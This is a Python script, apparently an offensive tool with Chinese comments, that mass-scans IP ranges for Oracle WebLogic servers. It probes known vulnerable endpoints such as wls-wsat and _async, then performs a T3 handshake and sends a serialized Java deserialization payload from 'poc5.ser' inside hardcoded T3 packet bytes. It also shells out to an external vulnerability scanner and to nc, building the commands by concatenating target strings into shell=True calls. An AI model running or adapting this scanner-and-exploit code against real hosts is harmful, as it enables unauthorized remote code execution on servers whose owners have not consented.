#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
import socket
import struct
import subprocess
import time
import logging
import argparse
import hashlib
from multiprocessing import Pool, Manager

headers = {'user-agent': 'ceshi/0.0.1'}
filename1='ip-scan.txt'
filename2='ip-scan-result.txt'
filename3='ip-t3.txt'
filename4='ip-iiop.txt'
list = ['80','8080','7001','7002']

logger = logging.getLogger(__name__)
logger.setLevel(level = logging.INFO)
rq = time.strftime('%Y%m%d%H%M', time.localtime(time.time()))
logfile = "扫描_" + rq + '.log'
handler = logging.FileHandler(logfile,mode='a')
logger.addHandler(handler)

def help():
    print("-s 进行weblogic-ip+端口页面存活扫描,目标ip或域名保存在ip-scan.txt,支持c段(格式192.168.1.0/24),一行一个,执行python3 weblogic_alive.py -s即可。可访问页面保存在ip-scan-result.txt,如经T3协议确认weblogic站点则继续使用修改版weblogic—scaner,输出漏洞详情")

    print("-t 进行weblogic-T3协议扫描,目标ip或域名保存在ip-t3.txt,一行一个,执行python3 weblogic_alive.py -t即可。")

    print("-i 进行weblogic-iiop协议扫描,目标ip或域名保存在ip-iiop.txt,一行一个,执行python3 weblogic_alive.py -i即可。")

#Weblogic模糊识别模块
def isweblogic(url):
    if 'http' not in url:
        url = 'http://' + url
        try:
            url1=url+'/console/login/LoginForm.jsp '
            r1 = requests.get(url1,timeout=5,headers=headers)
            logger.info(url1)
            # logger.info("Scan:站点：{}\t状态码：{}".format(url1,r1.status_code))
            print("当前站点：{}\t状态码：{}".format(url1,r1.status_code))

            url2=url+'/wls-wsat/CoordinatorPortType'
            r2 = requests.get(url2, timeout=5, headers=headers)
            logger.info(url2)
            # logger.info("Scan:站点：{}\t状态码：{}".format(url2, r2.status_code))
            print("当前站点：{}\t状态码：{}".format(url2, r2.status_code))

            url3 = url + '/_async/AsyncResponseService '
            r3 = requests.get(url3, timeout=5, headers=headers)
            logger.info(url3)
            # logger.info("Scan:站点：{}\t状态码：{}".format(url3, r3.status_code))
            print("当前站点：{}\t状态码：{}".format(url3, r3.status_code))

            url4 = url + '/ws_utc/config.do            '
            r4 = requests.get(url4, timeout=5, headers=headers)
            logger.info(url4)
            # logger.info("Scan:站点：{}\t状态码：{}".format(url4, r4.status_code))
            print("当前站点：{}\t状态码：{}".format(url4, r4.status_code))

            return r1.status_code, r2.status_code, r3.status_code, r4.status_code
        except:
            logger.info("Scan:站点：{}\t响应超时\n".format(url))
            print("当前站点：{}\t响应超时".format(url))

def readtxt(url,i,q):
    r1,r2,r3,r4=isweblogic(url)
    if r1 == 200 or r2 == 200 or r3 ==200 or r4 ==200:
        fw = open(filename2, 'a')
        fw.write(url + '\n')
        fw.close()
        ipport = url.split(':')
        isweblogicT3(ipport[0],int(ipport[1]))
        q.put(i)

#Weblogic-T3协议模糊识别模块
def isweblogicT3(ip,port):
    try:
        target = WebLogic(ip, int(port), "poc5.ser")
        target.poc()
    except Exception as e:
        print("[ERROR]: T3:" + str(e))
        logger.warning("[ERROR]: T3:" + str(e))
        exit()

#C段输出ip段
def ctoip(c):
    list_ip = []
    try:
        ips = c.strip()
        ips = ips[:-4]
        for i in range(1,255):
            list_ip.append(ips+(str(i)))
        logger.info("Ctoip:C段转换完成")
        return list_ip
    except:
        logger.warning("[ERROR]: Ctoip:C段转换失败")
        print("C段转换失败")

#Weblogic-iiop协议模糊识别模块
def isweblogiciiop(url):
    command = "nc " + url + " <test.txt "
    result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True);
    if "GIOP" in result:
        logger.info("IIOP:可能存在IIOP漏洞:" + url)
        print("IIOP:可能存在IIOP漏洞" + url)


# 进程池管理模块
def poolmana_scan():
    ip_s = []
    p = Pool(20)
    q = Manager().Queue()
    fr1 = open(filename1, 'r')
    urls=fr1.readlines()
    fr1.close()
    for i in range(len(urls)):
        for port in list:
            if urls[i].isspace() == False:
                if "/24" in urls[i]:
                    ip_s = ctoip(urls[i])
                    for ip_url in ip_s:
                        ip = ip_url+':'+ port
                        p.apply_async(readtxt, args=(ip,i,q))
                else:
                    url = urls[i].strip()+':'+ port
                    url = url.replace("\n", '')
                    p.apply_async(readtxt, args=(url,i,q))
    p.close()
    p.join()
    print('>>>>>Scan扫描任务结束\n')

# 进程池管理模块
def poolmana_T3():
    p = Pool(10)
    q = Manager().Queue()
    fr2 = open(filename3, 'r')
    urls=fr2.readlines()
    fr2.close()
    for i in range(len(urls)):
        for port in list:
            if urls[i].isspace() == False:
                url = urls[i]
                url = url.replace("\n", '')
                p.apply_async(isweblogicT3, args=(url,port))
    p.close()
    p.join()
    print('>>>>>T3扫描任务结束\n')

# 进程池管理模块
def poolmana_iiop():
    p = Pool(10)
    q = Manager().Queue()
    fr2 = open(filename4, 'r')
    urls=fr2.readlines()
    fr2.close()
    for i in range(len(urls)):
        for port in list:
            if urls[i].isspace() == False:
                url = urls[i]
                url = url.replace("\n", '')
                p.apply_async(isweblogiciiop, args=(url))
    p.close()
    p.join()
    print('>>>>>IIOP扫描任务结束\n')

def main_scan():
    poolmana_scan()

def main_t3():
    poolmana_T3()

def main_iiop():
    poolmana_iiop()

#T3协议发送模块
class WebLogic():

    def __init__(self, url, port, ser_file):
        self.ip = url
        self.port = port
        self.sock = self.get_sock(self.ip, self.port)
        self.ser_payload = open(ser_file,'rb').read()

    @staticmethod
    def get_sock(ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (ip, port)
            sock.connect(server_address)
            # print("[INFO]: connecting to %s port %s" % server_address)
        except Exception as e:
            print("[ERROR]: " + str(e))

        return sock

    def t3_hand(self):
        handshake = b't3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n'
        # print("[INFO]: sending handshake packet ...")
        # print("[INFO]: <<< Packet Content >>>")
        # print(handshake.decode())
        # print("[INFO]: <<< Packet Content >>>")
        self.sock.sendall(handshake)

        data = self.sock.recv(1024)
        # print("[INFO]: received handshake data")
        # print("[INFO]: <<< Packet Content >>>")
        # print(type(data.decode()))
        if "HELO" in data.decode():
            print("ohhhhhhhhhhhhhhhhhhhhhhh!这是weblogic" + self.ip + ":" + str(self.port))
            re = requests.get("http://" + self.ip + ":" + str(self.port) + "/336311a016184326ddbdd61edd4eeb52", timeout=5, headers=headers)
            text1 = "Hypertext Transfer Protocol"
            text2 = "The server has not found anything matching the Request-URI"
            if text1 in re.text:
                if text2 in re.text:
                    print("ohhhhhhhhhhhhhhhhhhhhhhh!这一定是weblogic" + self.ip + ":" + str(self.port))
                    logger.info("T3:此站点为weblogic" + self.ip + ":" + str(self.port))
                    command = "python3 ./Weblogic_Vuln_Scan/ws.py -t " + self.ip + ":" + str(self.port)
                    # print(command)
                    result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True);
                    # print(result.decode('utf-8','replace'))
                    str1 = result.decode('utf-8','replace')
                    m = str1.split('\r\n')
                    for i in m:
                        if "Exists" in i:
                            logger.info("weblogicScanner:存在漏洞:" + i)
                            print("找到漏洞：" + i)
        # print("[INFO]: <<< Packet Content >>>")

    def choose(self):
        payload_1 = b'\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
        payload_2 = b'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'

        return payload_1, payload_2

    def poc(self):
        try:
            self.t3_hand()
            payload_1, payload_2 = self.choose()
            payload = payload_1 + self.ser_payload + payload_2
            payload = struct.pack("!i", len(payload)) + payload[4:]
            # print("[INFO]: Sending payload ...")
            self.sock.send(payload)
        except Exception as e:
            print("[ERROR]: " + str(e))

if "__main__" == __name__:
    try:
        if sys.argv[1] == '-s':
            main_scan()
        elif sys.argv[1] == '-t':
            main_t3()
        elif sys.argv[1] == '-i':
            main_iiop()
        else:
            help()
    except:
        help()


